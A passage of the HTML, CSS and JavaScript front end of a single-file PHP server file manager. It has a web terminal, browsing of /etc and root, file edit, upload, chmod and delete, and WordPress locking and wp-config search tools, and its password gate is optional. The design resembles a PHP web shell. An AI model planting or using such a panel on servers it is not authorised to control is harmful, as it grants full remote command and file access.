    --accent: #a78bfa;
    --accent-2: #60a5fa;
    --accent-3: #34d399;
    --danger: #f87171;
    --warning: #fbbf24;
    --radius: 10px;
    --radius-lg: 14px;
    --transition: .2s cubic-bezier(.4,0,.2,1);
    --glow: 0 0 30px rgba(167,139,250,.08);
}
html, body { height:100%; overflow:hidden; }
body {
    background: var(--bg-primary);
    color: var(--text-primary);
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    font-size: 13px;
    line-height: 1.5;
}

/* ── Layout ───────────────────────────────── */
#app { display:flex; flex-direction:column; height:100vh; }
.topbar {
    display:flex; align-items:center; gap:12px;
    padding:0 20px; height:52px; min-height:52px;
    background: rgba(10,10,20,.9);
    backdrop-filter: blur(20px);
    border-bottom:1px solid var(--border);
    z-index:100;
}
.topbar .logo {
    font-weight:700; font-size:15px;
    background: linear-gradient(135deg, var(--accent), var(--accent-2));
    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
    display:flex; align-items:center; gap:8px;
    white-space:nowrap;
}
.topbar .logo span { font-size:18px; -webkit-text-fill-color:initial; }

.breadcrumb {
    display:flex; align-items:center; gap:4px;
    flex:1; overflow-x:auto; padding:4px 8px;
    scrollbar-width:none;
}
.breadcrumb::-webkit-scrollbar { display:none; }
.breadcrumb a {
    color:var(--text-secondary); text-decoration:none;
    padding:4px 8px; border-radius:6px; white-space:nowrap;
    transition: var(--transition);
}
.breadcrumb a:hover { background:var(--bg-hover); color:var(--text-primary); }
.breadcrumb .sep { color:var(--text-muted); font-size:11px; }
.breadcrumb a:last-child { color:var(--accent); font-weight:600; }

.topbar-actions { display:flex; gap:6px; }

.main-content { display:flex; flex:1; overflow:hidden; }

/* ── Sidebar ──────────────────────────────── */
.sidebar {
    width:220px; min-width:220px;
    background: var(--bg-secondary);
    border-right:1px solid var(--border);
    display:flex; flex-direction:column;
    overflow:hidden;
}
.sidebar-section { padding:16px 12px 8px; }
.sidebar-section h3 {
    font-size:10px; text-transform:uppercase; letter-spacing:1.5px;
    color:var(--text-muted); margin-bottom:8px; padding:0 8px;
}
.sidebar-item {
    display:flex; align-items:center; gap:10px;
    padding:8px 12px; border-radius:8px; cursor:pointer;
    color:var(--text-secondary); transition: var(--transition);
    font-size:12.5px; user-select:none;
}
.sidebar-item:hover { background:var(--bg-hover); color:var(--text-primary); }
.sidebar-item.active { background:rgba(167,139,250,.1); color:var(--accent); }
.sidebar-item .icon { font-size:16px; width:20px; text-align:center; }
.sidebar-info {
    margin-top:auto; padding:12px;
    border-top:1px solid var(--border);
    font-size:11px; color:var(--text-muted);
}
.sidebar-info div { padding:3px 8px; display:flex; justify-content:space-between; }
.sidebar-info .val { color:var(--text-secondary); }

/* ── File Table ───────────────────────────── */
.file-panel { flex:1; display:flex; flex-direction:column; overflow:hidden; }

.toolbar {
    display:flex; align-items:center; gap:8px;
    padding:10px 20px;
    border-bottom:1px solid var(--border);
    background: rgba(10,10,20,.5);
    flex-wrap: wrap;
}
.search-box {
    display:flex; align-items:center; gap:8px;
    background:rgba(255,255,255,.04);
    border:1px solid var(--border);
    border-radius:8px; padding:0 12px;
    flex:1; max-width:320px;
    transition: var(--transition);
}
.search-box:focus-within { border-color:var(--border-active); box-shadow:0 0 0 3px rgba(167,139,250,.1); }
.search-box input {
    background:none; border:none; color:var(--text-primary);
    padding:8px 0; outline:none; width:100%; font-size:12.5px;
}
.search-box .icon { color:var(--text-muted); font-size:14px; }

.btn {
    display:inline-flex; align-items:center; gap:6px;
    padding:7px 14px; border-radius:8px; border:1px solid var(--border);
    background:rgba(255,255,255,.03); color:var(--text-secondary);
    font-size:12px; cursor:pointer; transition: var(--transition);
    white-space:nowrap; user-select:none;
}
.btn:hover { background:rgba(255,255,255,.07); color:var(--text-primary); border-color:rgba(255,255,255,.12); }
.btn.primary {
    background:linear-gradient(135deg, rgba(124,58,237,.25), rgba(59,130,246,.25));
    border-color:rgba(167,139,250,.3); color:var(--accent);
}
.btn.primary:hover { background:linear-gradient(135deg, rgba(124,58,237,.35), rgba(59,130,246,.35)); }
.btn.danger { border-color:rgba(248,113,113,.2); color:var(--danger); }
.btn.danger:hover { background:rgba(248,113,113,.1); }
.btn .icon { font-size:14px; }

.file-list-wrapper { flex:1; overflow-y:auto; }
.file-list-wrapper::-webkit-scrollbar { width:6px; }
.file-list-wrapper::-webkit-scrollbar-track { background:transparent; }
.file-list-wrapper::-webkit-scrollbar-thumb { background:rgba(255,255,255,.08); border-radius:3px; }

table.file-table { width:100%; border-collapse:collapse; }
table.file-table th {
    position:sticky; top:0; z-index:10;
    padding:10px 16px; text-align:left;
    font-size:10.5px; text-transform:uppercase; letter-spacing:1px;
    color:var(--text-muted); background:var(--bg-secondary);
    border-bottom:1px solid var(--border);
    user-select:none; cursor:pointer;
}
table.file-table th:hover { color:var(--text-secondary); }
table.file-table td {
    padding:8px 16px; border-bottom:1px solid rgba(255,255,255,.02);
    white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
    max-width:300px;
}
table.file-table tr { transition: var(--transition); }
table.file-table tbody tr:hover { background:var(--bg-hover); }
table.file-table tbody tr.selected { background:rgba(167,139,250,.08); }
table.file-table .fname {
    display:flex; align-items:center; gap:10px; cursor:pointer;
}
table.file-table .fname .ficon { font-size:18px; flex-shrink:0; }
table.file-table .fname .ftext { overflow:hidden; text-overflow:ellipsis; }
table.file-table .fperms {
    font-family:'SF Mono','Cascadia Code','Fira Code',monospace;
    font-size:11px; color:var(--text-muted);
}
table.file-table .fsize { color:var(--text-secondary); font-size:12px; }
table.file-table .fdate { color:var(--text-muted); font-size:12px; }

/* ── Context Menu ─────────────────────────── */
.ctx-menu {
    position:fixed; z-index:1000;
    background:rgba(18,18,35,.95);
    backdrop-filter:blur(20px);
    border:1px solid var(--border);
    border-radius:12px; padding:6px;
    min-width:200px;
    box-shadow:0 8px 40px rgba(0,0,0,.5), var(--glow);
    display:none;
    animation: ctxIn .15s ease;
}
@keyframes ctxIn { from { opacity:0; transform:scale(.96) translateY(-4px); } }
.ctx-item {
    display:flex; align-items:center; gap:10px;
    padding:9px 14px; border-radius:8px; cursor:pointer;
    color:var(--text-secondary); transition: var(--transition);
    font-size:12.5px;
}
.ctx-item:hover { background:var(--bg-hover); color:var(--text-primary); }
.ctx-item.danger { color:var(--danger); }
.ctx-item .icon { width:18px; text-align:center; font-size:14px; }
.ctx-sep { height:1px; background:var(--border); margin:4px 8px; }

/* ── Modal ────────────────────────────────── */
.modal-overlay {
    position:fixed; inset:0; z-index:500;
    background:rgba(0,0,0,.6);
    backdrop-filter:blur(4px);
    display:none; align-items:center; justify-content:center;
    animation: fadeIn .2s ease;
}
@keyframes fadeIn { from { opacity:0; } }
.modal-overlay.show { display:flex; }
.modal {
    background:rgba(16,16,32,.95);
    backdrop-filter:blur(30px);
    border:1px solid var(--border);
    border-radius:16px; padding:28px;
    min-width:400px; max-width:90vw; max-height:90vh;
    box-shadow:0 20px 60px rgba(0,0,0,.5), var(--glow);
    overflow-y:auto;
    animation: modalIn .25s ease;
}
@keyframes modalIn { from { opacity:0; transform:translateY(12px) scale(.97); } }
.modal h2 {
    font-size:16px; margin-bottom:20px;
    display:flex; align-items:center; gap:10px;
}
.modal label { display:block; color:var(--text-secondary); font-size:12px; margin-bottom:6px; margin-top:14px; }
.modal input[type="text"], .modal select {
    width:100%; padding:10px 14px;
    background:rgba(255,255,255,.04);
    border:1px solid var(--border);
    border-radius:8px; color:var(--text-primary);
    font-size:13px; outline:none;
    transition: var(--transition);
}
.modal input:focus, .modal select:focus { border-color:var(--border-active); }
.modal-actions { display:flex; gap:8px; justify-content:flex-end; margin-top:24px; }

/* ── Editor ───────────────────────────────── */
.editor-panel {
    display:none; flex-direction:column; flex:1; overflow:hidden;
}
.editor-panel.show { display:flex; }
.editor-header {
    display:flex; align-items:center; gap:12px;
    padding:10px 20px;
    border-bottom:1px solid var(--border);
    background:rgba(10,10,20,.5);
}
.editor-header .file-path {
    flex:1; font-family:'SF Mono','Cascadia Code',monospace;
    font-size:12px; color:var(--text-secondary);
    overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
}
.editor-header .unsaved { color:var(--warning); font-size:11px; display:none; }
#editor {
    flex:1; width:100%;
    background:var(--bg-primary);
    color:var(--text-primary);
    font-family:'SF Mono','Cascadia Code','Fira Code',monospace;
    font-size:13px; line-height:1.7;
    padding:16px 20px;
    border:none; outline:none; resize:none;
    tab-size:4;
}

/* ── Terminal ─────────────────────────────── */
.terminal-panel {
    display:none; flex-direction:column;
    height:260px; min-height:100px;
    border-top:1px solid var(--border);
    background:rgba(6,6,14,.95);
}
.terminal-panel.show { display:flex; }
.terminal-header {
    display:flex; align-items:center; gap:10px;
    padding:8px 16px;
    border-bottom:1px solid var(--border);
    font-size:12px;
}
.terminal-header .title { color:var(--accent-3); font-weight:600; display:flex; align-items:center; gap:6px; }
.terminal-output {
    flex:1; overflow-y:auto; padding:12px 16px;
    font-family:'SF Mono','Cascadia Code',monospace;
    font-size:12px; line-height:1.6;
    white-space:pre-wrap; word-break:break-all;
    color:#c0c0d0;
}
.terminal-output::-webkit-scrollbar { width:5px; }
.terminal-output::-webkit-scrollbar-thumb { background:rgba(255,255,255,.06); border-radius:3px; }
.terminal-input-line {
    display:flex; align-items:center;
    padding:8px 16px;
    border-top:1px solid var(--border);
    gap:8px;
}
.terminal-input-line .prompt { color:var(--accent-3); font-family:monospace; font-size:12px; white-space:nowrap; }
.terminal-input-line input {
    flex:1; background:none; border:none; outline:none;
    color:var(--text-primary); font-family:monospace; font-size:12px;
}

/* ── Upload Zone ──────────────────────────── */
.upload-zone {
    border:2px dashed rgba(167,139,250,.2);
    border-radius:12px; padding:40px;
    text-align:center; margin:16px;
    transition: var(--transition);
    cursor:pointer;
}
.upload-zone:hover, .upload-zone.dragover {
    border-color:var(--accent);
    background:rgba(167,139,250,.05);
}
.upload-zone .icon { font-size:40px; margin-bottom:12px; }
.upload-zone p { color:var(--text-secondary); font-size:13px; }
.upload-zone .sub { color:var(--text-muted); font-size:11px; margin-top:4px; }
.upload-progress {
    margin:8px 16px; padding:8px 14px;
    background:rgba(167,139,250,.08);
    border-radius:8px; font-size:12px;
    color:var(--accent); display:none;
}

/* ── Toast ────────────────────────────────── */
.toast-container { position:fixed; bottom:20px; right:20px; z-index:9999; display:flex; flex-direction:column; gap:8px; }
.toast {
    padding:12px 20px; border-radius:10px;
    background:rgba(18,18,35,.95);
    backdrop-filter:blur(20px);
    border:1px solid var(--border);
    color:var(--text-primary);
    font-size:12.5px;
    box-shadow:0 8px 30px rgba(0,0,0,.3);
    animation: toastIn .3s ease, toastOut .3s ease 2.7s forwards;
    display:flex; align-items:center; gap:10px;
}
.toast.success { border-color:rgba(52,211,153,.3); }
.toast.success::before { content:'✓'; color:var(--accent-3); font-weight:bold; }
.toast.error { border-color:rgba(248,113,113,.3); }
.toast.error::before { content:'✕'; color:var(--danger); font-weight:bold; }
@keyframes toastIn { from { opacity:0; transform:translateX(30px); } }
@keyframes toastOut { to { opacity:0; transform:translateX(30px); } }

/* ── Drag highlight ───────────────────────── */
.file-panel.drag-active::after {
    content:'Drop files to upload';
    position:absolute; inset:0;
    display:flex; align-items:center; justify-content:center;
    background:rgba(7,7,13,.9);
    color:var(--accent);
    font-size:18px; font-weight:600;
    border:2px dashed var(--accent);
    border-radius:12px;
    z-index:50;
    pointer-events:none;
}
.file-panel { position:relative; }

/* ── WP Status Banner ─────────────────────── */
.wp-banner {
    display:none; padding:10px 16px;
    border-bottom:1px solid var(--border);
    font-size:12px;
    animation: fadeIn .3s ease;
}
.wp-banner.detected {
    display:flex; align-items:center; gap:10px;
    background:linear-gradient(135deg, rgba(52,211,153,.06), rgba(96,165,250,.06));
    border-bottom-color:rgba(52,211,153,.15);
}
.wp-banner.locked {
    background:linear-gradient(135deg, rgba(52,211,153,.1), rgba(52,211,153,.03));
}
.wp-banner.unlocked {
    background:linear-gradient(135deg, rgba(248,113,113,.08), rgba(251,191,36,.06));
    border-bottom-color:rgba(248,113,113,.15);
}
.wp-banner .wp-badge {
    padding:3px 10px; border-radius:6px; font-size:10px;
    font-weight:700; text-transform:uppercase; letter-spacing:.5px;
}
.wp-banner .wp-badge.safe { background:rgba(52,211,153,.15); color:var(--accent-3); }
.wp-banner .wp-badge.warn { background:rgba(248,113,113,.15); color:var(--danger); }
.wp-status-dot {
    width:8px; height:8px; border-radius:50%; display:inline-block;
    animation: pulse 2s infinite;
}
.wp-status-dot.green { background:var(--accent-3); box-shadow:0 0 8px rgba(52,211,153,.5); }
.wp-status-dot.red { background:var(--danger); box-shadow:0 0 8px rgba(248,113,113,.5); }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }

.btn.wp-lock {
    background:linear-gradient(135deg, rgba(52,211,153,.2), rgba(52,211,153,.1));
    border-color:rgba(52,211,153,.3); color:var(--accent-3);
}
.btn.wp-lock:hover {
    background:linear-gradient(135deg, rgba(52,211,153,.3), rgba(52,211,153,.15));
    box-shadow:0 0 15px rgba(52,211,153,.15);
}

/* ── Responsive ───────────────────────────── */
@media (max-width:768px) {
    .sidebar { display:none; }
    .modal { min-width:90vw; }
}
</style>
</head>
<body>

<div id="app">
    <!-- Top Bar -->
    <div class="topbar">
        <div class="logo"><span>⬡</span> <?=APP_NAME?></div>
        <div class="breadcrumb" id="breadcrumb"></div>
        <div class="topbar-actions">
            <button class="btn wp-lock" id="wpLockBtn" onclick="wpQuickLock()" title="Auto-detect & lock WP" style="display:none">🔒 WP Lock</button>
            <button class="btn" onclick="toggleTerminal()" title="Terminal">💻 Terminal</button>
            <button class="btn" onclick="showInfo()" title="Server Info">ℹ️ Info</button>
            <?php if(PASSWORD !== ''): ?>
            <button class="btn danger" onclick="location.href='?logout'" title="Logout">🚪</button>
            <?php endif; ?>
        </div>
    </div>

    <div class="main-content">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-section">
                <h3>Quick Access</h3>
                <div class="sidebar-item" onclick="navigateTo('/')"><span class="icon">💿</span> Root /</div>
                <div class="sidebar-item" onclick="navigateTo('/tmp')"><span class="icon">📁</span> /tmp</div>
                <div class="sidebar-item" onclick="navigateTo('/var/www')"><span class="icon">🌐</span> /var/www</div>
                <div class="sidebar-item" onclick="navigateTo('/home')"><span class="icon">🏠</span> /home</div>
                <div class="sidebar-item" onclick="navigateTo('/etc')"><span class="icon">⚙️</span> /etc</div>
                <div class="sidebar-item" onclick="navigateTo('<?=addslashes(__DIR__)?>')"><span class="icon">📌</span> Script Dir</div>
            </div>
            <div class="sidebar-section">
                <h3>WordPress</h3>
                <div class="sidebar-item" onclick="wpQuickLock()" id="sidebarWpLock"><span class="icon">🔒</span> Quick Lock</div>
                <div class="sidebar-item" onclick="wpAutoHarden()"><span class="icon">🔧</span> WP Hardening</div>
                <div class="sidebar-item" onclick="wpScan()"><span class="icon">🔍</span> Find wp-config</div>
                <div class="sidebar-item" onclick="wpTools()"><span class="icon">📝</span> Manual Path</div>
                <div id="wpSidebarStatus" style="padding:8px 12px;font-size:11px;color:var(--text-muted);display:none"></div>
            </div>
            <div class="sidebar-info" id="sidebar-info"></div>
        </div>

        <!-- File List / Editor Container -->
        <div class="file-panel" id="filePanel">
            <!-- WP Auto-detect Banner -->
            <div class="wp-banner" id="wpBanner"></div>
            <!-- Toolbar -->
            <div class="toolbar" id="toolbar">
                <div class="search-box">
                    <span class="icon">🔍</span>
                    <input type="text" id="searchInput" placeholder="Search files..." onkeyup="handleSearch(event)">
                </div>
                <button class="btn primary" onclick="showCreateModal('file')">📄 New File</button>
                <button class="btn primary" onclick="showCreateModal('folder')">📁 New Folder</button>
                <button class="btn" onclick="showUploadModal()">⬆️ Upload</button>
                <button class="btn" onclick="refreshDir()">🔄 Refresh</button>
            </div>

            <!-- File table -->
            <div class="file-list-wrapper" id="fileListWrapper">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th onclick="sortBy('name')" style="width:40%">Name ↕</th>
                            <th onclick="sortBy('size')" style="width:12%">Size ↕</th>
                            <th onclick="sortBy('perms')" style="width:10%">Perms</th>
                            <th onclick="sortBy('owner')" style="width:12%">Owner</th>
                            <th onclick="sortBy('mtime')" style="width:20%">Modified ↕</th>
                            <th style="width:6%"></th>
                        </tr>
                    </thead>
                    <tbody id="fileTableBody"></tbody>
                </table>
            </div>

            <!-- Editor (hidden by default) -->
            <div class="editor-panel" id="editorPanel">
                <div class="editor-header">
                    <span style="font-size:16px">📝</span>
                    <span class="file-path" id="editorPath"></span>
                    <span class="unsaved" id="unsavedBadge">● unsaved</span>
                    <button class="btn primary" onclick="saveFile()">💾 Save</button>
                    <button class="btn" onclick="closeEditor()">✕ Close</button>
                </div>
                <textarea id="editor" spellcheck="false"></textarea>
            </div>
        </div>
    </div>

    <!-- Terminal -->
    <div class="terminal-panel" id="terminalPanel">
        <div class="terminal-header">
            <span class="title">⬢ Terminal</span>
            <span style="flex:1"></span>
            <button class="btn" style="padding:4px 10px;font-size:11px" onclick="clearTerminal()">Clear</button>
            <button class="btn" style="padding:4px 10px;font-size:11px" onclick="toggleTerminal()">✕</button>
        </div>
        <div class="terminal-output" id="termOutput"></div>
        <div class="terminal-input-line">
            <span class="prompt" id="termPrompt">$</span>
            <input type="text" id="termInput" placeholder="Enter command..." onkeydown="handleTermKey(event)">
        </div>
    </div>
</div>

<!-- Context Menu -->
<div class="ctx-menu" id="ctxMenu">
    <div class="ctx-item" onclick="ctxOpen()"><span class="icon">📂</span> Open</div>
    <div class="ctx-item" onclick="ctxEdit()"><span class="icon">📝</span> Edit</div>
    <div class="ctx-item" onclick="ctxDownload()"><span class="icon">⬇️</span> Download</div>
    <div class="ctx-sep"></div>
    <div class="ctx-item" onclick="ctxRename()"><span class="icon">✏️</span> Rename</div>
    <div class="ctx-item" onclick="ctxCopy()"><span class="icon">📋</span> Copy</div>
    <div class="ctx-item" onclick="ctxChmod()"><span class="icon">🔒</span> Permissions</div>
    <div class="ctx-sep"></div>
    <div class="ctx-item" onclick="ctxCompress('zip')"><span class="icon">📦</span> Compress (ZIP)</div>
    <div class="ctx-item" onclick="ctxCompress('tar.gz')"><span class="icon">📦</span> Compress (TAR.GZ)</div>
    <div class="ctx-item" onclick="ctxExtract()"><span class="icon">📂</span> Extract Here</div>
    <div class="ctx-sep"></div>
    <div class="ctx-item danger" onclick="ctxDelete()"><span class="icon">🗑️</span> Delete</div>
</div>

<!-- Modal -->
<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this)closeModal()">
    <div class="modal" id="modalContent"></div>
</div>

<!-- Toast Container -->
<div class="toast-container" id="toastContainer"></div>

<script>
// ── State ──────────────────────────────────────
let currentDir = <?=json_encode($current_dir)?>;
let fileItems = [];
let sortField = 'name';
let sortAsc = true;
let ctxTarget = null;
let editingFile = null;
let editDirty = false;
let cmdHistory = [];
let cmdHistIdx = -1;
const SELF = location.pathname;

// ── File Icons ─────────────────────────────────
const FILE_ICONS = {
    folder:'📁', link_folder:'🔗', default:'📄',
    php:'🐘', js:'📜', ts:'📜', jsx:'⚛️', tsx:'⚛️',
    py:'🐍', rb:'💎', go:'🔷', rs:'🦀', java:'☕', c:'⚙️', cpp:'⚙️', h:'⚙️',
    html:'🌐', css:'🎨', scss:'🎨', less:'🎨',
    json:'📋', xml:'📋', yml:'📋', yaml:'📋', toml:'📋',
    md:'📖', txt:'📝', log:'📊', csv:'📊',
    sql:'🗃️', db:'🗃️', sqlite:'🗃️',
    sh:'🖥️', bash:'🖥️', zsh:'🖥️', bat:'🖥️', ps1:'🖥️',
    zip:'📦', tar:'📦', gz:'📦', rar:'📦', '7z':'📦',
    jpg:'🖼️', jpeg:'🖼️', png:'🖼️', gif:'🖼️', svg:'🖼️', webp:'🖼️', ico:'🖼️', bmp:'🖼️',
    mp3:'🎵', wav:'🎵', flac:'🎵', ogg:'🎵',
    mp4:'🎬', avi:'🎬', mkv:'🎬', mov:'🎬',
    pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', ppt:'📙',
    key:'🔑', pem:'🔑', crt:'🔑', conf:'⚙️', cfg:'⚙️', ini:'⚙️', env:'⚙️',
    gitignore:'🔧', dockerfile:'🐳', makefile:'🔧',
};

function getIcon(name, isDir, isLink) {
    if (isDir) return isLink ? FILE_ICONS.link_folder : FILE_ICONS.folder;
    const ext = name.split('.').pop().toLowerCase();
    const baseName = name.toLowerCase();
    if (FILE_ICONS[baseName]) return FILE_ICONS[baseName];
    return FILE_ICONS[ext] || FILE_ICONS.default;
}

// ── API Helpers ────────────────────────────────
async function api(action, params = {}) {
    const url = new URL(SELF, location.origin);
    url.searchParams.set('action', action);
    for (const [k, v] of Object.entries(params)) {
        if (typeof v === 'string') url.searchParams.set(k, v);
    }
    const resp = await fetch(url);
    return resp.json();
}

async function apiPost(action, body = {}) {
    const url = new URL(SELF, location.origin);
    url.searchParams.set('action', action);
    const resp = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
    });
    return resp.json();
}

// ── Toast ──────────────────────────────────────
function toast(msg, type = 'success') {
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.textContent = msg;
    document.getElementById('toastContainer').appendChild(el);
    setTimeout(() => el.remove(), 3000);
}

// ── Navigation ─────────────────────────────────
async function navigateTo(dir) {
    closeEditor();
    const data = await api('list', { dir });
    if (!data.success) { toast(data.message, 'error'); return; }
    currentDir = data.current;
    fileItems = data.items;
    renderBreadcrumb();
    renderFiles();
    document.getElementById('termPrompt').textContent = shortPath(currentDir) + ' $';
}

function shortPath(p) {
    if (p.length > 40) return '...' + p.slice(-37);
    return p;
}

function renderBreadcrumb() {
    const bc = document.getElementById('breadcrumb');
    const parts = currentDir.split('/').filter(Boolean);
    let html = `<a href="#" onclick="navigateTo('/');return false">/</a>`;
    let path = '';
    parts.forEach((p, i) => {
        path += '/' + p;
        const pp = path;
        html += `<span class="sep">›</span><a href="#" onclick="navigateTo('${pp.replace(/'/g, "\\'")}');return false">${p}</a>`;
    });
    bc.innerHTML = html;
}

// ── Sorting ────────────────────────────────────
function sortBy(field) {
    if (sortField === field) sortAsc = !sortAsc;
    else { sortField = field; sortAsc = true; }
    renderFiles();
}

function compareItems(a, b) {
    // Always sort .. first, then dirs, then files
    if (a.name === '..') return -1;
    if (b.name === '..') return 1;
    if (a.is_dir && !b.is_dir) return -1;
    if (!a.is_dir && b.is_dir) return 1;
    let va = a[sortField], vb = b[sortField];
    if (sortField === 'name') { va = va.toLowerCase(); vb = vb.toLowerCase(); }
    if (sortField === 'size') { va = Number(va); vb = Number(vb); }
    let cmp = va < vb ? -1 : va > vb ? 1 : 0;
    return sortAsc ? cmp : -cmp;
}

// ── Rendering ──────────────────────────────────
function renderFiles() {
    const tbody = document.getElementById('fileTableBody');
    const sorted = [...fileItems].sort(compareItems);
    let html = '';
    sorted.forEach(item => {
        const icon = getIcon(item.name, item.is_dir, item.is_link);
        const size = item.is_dir ? (item.name === '..' ? '' : '—') : formatSize(item.size);
        const cls = item.writable ? '' : 'style="opacity:.6"';
        html += `<tr data-path="${esc(item.path)}" data-isdir="${item.is_dir}" data-name="${esc(item.name)}"
                     oncontextmenu="showCtx(event, this)" ondblclick="dblClickItem(this)" ${cls}>
            <td><div class="fname" onclick="clickItem(this.parentElement.parentElement)">
                <span class="ficon">${icon}</span>
                <span class="ftext">${esc(item.name)}${item.is_link?' → ':''}${item.is_link && item.is_dir?'':''}
                </span>
            </div></td>
            <td class="fsize">${size}</td>
            <td class="fperms">${item.perms || ''}</td>
            <td class="fsize">${item.owner || ''}</td>
            <td class="fdate">${item.mtime || ''}</td>
            <td style="text-align:right">
                <span style="cursor:pointer;opacity:.4;font-size:16px" onclick="showCtx(event,this.closest('tr'))">⋮</span>
            </td>
        </tr>`;
    });
    tbody.innerHTML = html;
}

function formatSize(bytes) {
    if (bytes <= 0) return '0 B';
    const u = ['B','KB','MB','GB','TB'];
    const i = Math.floor(Math.log(bytes)/Math.log(1024));
    return (bytes/Math.pow(1024,i)).toFixed(i?1:0)+' '+u[i];
}

function esc(s) { const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }

// ── Item Interactions ──────────────────────────
function clickItem(tr) {
    const isDir = tr.dataset.isdir === 'true' || tr.dataset.isdir === '1';
    if (isDir) {
        navigateTo(tr.dataset.path);
    } else {
        openFile(tr.dataset.path);
    }
}

function dblClickItem(tr) { clickItem(tr); }

async function openFile(path) {
    const data = await api('read', { file: path });
    if (!data.success) { toast(data.message, 'error'); return; }
    editingFile = path;
    editDirty = false;
    document.getElementById('editorPath').textContent = path;
    document.getElementById('editor').value = data.content;
    document.getElementById('unsavedBadge').style.display = 'none';
    document.getElementById('editorPanel').classList.add('show');
    document.getElementById('fileListWrapper').style.display = 'none';
    document.getElementById('toolbar').style.display = 'none';
}

function closeEditor() {
    if (editDirty && !confirm('Discard unsaved changes?')) return;
    document.getElementById('editorPanel').classList.remove('show');
    document.getElementById('fileListWrapper').style.display = '';
    document.getElementById('toolbar').style.display = '';
    editingFile = null;
    editDirty = false;
}

document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('editor').addEventListener('input', () => {
        editDirty = true;
        document.getElementById('unsavedBadge').style.display = 'inline';
    });
    // Tab support in editor
    document.getElementById('editor').addEventListener('keydown', (e) => {
        if (e.key === 'Tab') {
            e.preventDefault();
            const ta = e.target;
            const start = ta.selectionStart;
            ta.value = ta.value.substring(0, start) + '    ' + ta.value.substring(ta.selectionEnd);
            ta.selectionStart = ta.selectionEnd = start + 4;
            editDirty = true;
            document.getElementById('unsavedBadge').style.display = 'inline';
        }
        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
            e.preventDefault();
            saveFile();
        }
    });
});

async function saveFile() {
    if (!editingFile) return;
    const content = document.getElementById('editor').value;
    const data = await apiPost('save', { file: editingFile, content });
    if (data.success) {
        toast('File saved');
        editDirty = false;
        document.getElementById('unsavedBadge').style.display = 'none';
    } else {
        toast(data.message, 'error');
    }
}

// ── Context Menu ───────────────────────────────
function showCtx(e, tr) {
    e.preventDefault();
    e.stopPropagation();
    ctxTarget = {
        path: tr.dataset.path,
        name: tr.dataset.name,
        isDir: tr.dataset.isdir === 'true' || tr.dataset.isdir === '1',
    };
    const menu = document.getElementById('ctxMenu');
    menu.style.display = 'block';
    const x = Math.min(e.clientX, window.innerWidth - 220);
    const y = Math.min(e.clientY, window.innerHeight - 400);
    menu.style.left = x + 'px';
    menu.style.top = y + 'px';
}

document.addEventListener('click', () => {
    document.getElementById('ctxMenu').style.display = 'none';
});

function ctxOpen() {
    if (!ctxTarget) return;
    if (ctxTarget.isDir) navigateTo(ctxTarget.path);
    else openFile(ctxTarget.path);
}
function ctxEdit() { if(ctxTarget) openFile(ctxTarget.path); }
function ctxDownload() {
    if (!ctxTarget || ctxTarget.isDir) return;
    const a = document.createElement('a');
    a.href = SELF + '?action=download&file=' + encodeURIComponent(ctxTarget.path);
    a.click();
}
function ctxRename() {
    if (!ctxTarget) return;
    showModal(`
        <h2>✏️ Rename</h2>
        <label>Current: <strong>${esc(ctxTarget.name)}</strong></label>
        <label>New name</label>
        <input type="text" id="renameInput" value="${esc(ctxTarget.name)}">
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Cancel</button>
            <button class="btn primary" onclick="doRename()">Rename</button>
        </div>
    `);
    setTimeout(() => { const inp = document.getElementById('renameInput'); inp.focus(); inp.select(); }, 100);
}
async function doRename() {
    const newName = document.getElementById('renameInput').value.trim();
    if (!newName) return;
    const dir = ctxTarget.path.substring(0, ctxTarget.path.lastIndexOf('/'));
    const data = await apiPost('rename', { old: ctxTarget.path, new: dir + '/' + newName });
    toast(data.message, data.success ? 'success' : 'error');
    closeModal();
    refreshDir();
}
function ctxCopy() {
    if (!ctxTarget) return;
    showModal(`
        <h2>📋 Copy</h2>
        <label>Source: <strong>${esc(ctxTarget.path)}</strong></label>
        <label>Destination path</label>
        <input type="text" id="copyDst" value="${esc(ctxTarget.path + '_copy')}">
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Cancel</button>
            <button class="btn primary" onclick="doCopy()">Copy</button>
        </div>
    `);
}
async function doCopy() {
    const dst = document.getElementById('copyDst').value.trim();
    if (!dst) return;
    const data = await apiPost('copy', { src: ctxTarget.path, dst });
    toast(data.message, data.success ? 'success' : 'error');
    closeModal();
    refreshDir();
}
function ctxChmod() {
    if (!ctxTarget) return;
    showModal(`
        <h2>🔒 Change Permissions</h2>
        <label>Path: <strong>${esc(ctxTarget.path)}</strong></label>
        <label>Mode (octal, e.g. 0755)</label>
        <input type="text" id="chmodInput" placeholder="0755">
        <div class="modal-actions">
            <button class="btn" onclick="closeModal()">Cancel</button>
            <button class="btn primary" onclick="doChmod()">Apply</button>
        </div>
    `);
}
async function doChmod() {
    const mode = document.getElementById('chmodInput').value.trim();
    if (!mode) return;
    const data = await apiPost('chmod', { path: ctxTarget.path, mode });
    toast(data.message, data.success ? 'success' : 'error');
    closeModal();
    refreshDir();
}
async function ctxCompress(type) {
    if (!ctxTarget) return;
    toast('Compressing...', 'success');
    const data = await apiPost('compress', { path: ctxTarget.path, type });
    toast(data.message, data.success ? 'success' : 'error');
    refreshDir();
}
async function ctxExtract() {
    if (!ctxTarget) return;
    toast('Extracting...', 'success');
    const data = await apiPost('extract', { file: ctxTarget.path, dest: currentDir });
    toast(data.message, data.success ? 'success' : 'error');
    refreshDir();
}
async function ctxDelete() {
    if (!ctxTarget) return;
    if (!confirm(`Delete "${ctxTarget.name}"?`)) return;
    const data = await apiPost('delete', { path: ctxTarget.path });
    toast(data.message, data.success ? 'success' : 'error');
    refreshDir();
}

// ── Create File/Folder ─────────────────────────
function showCreateModal(type) {
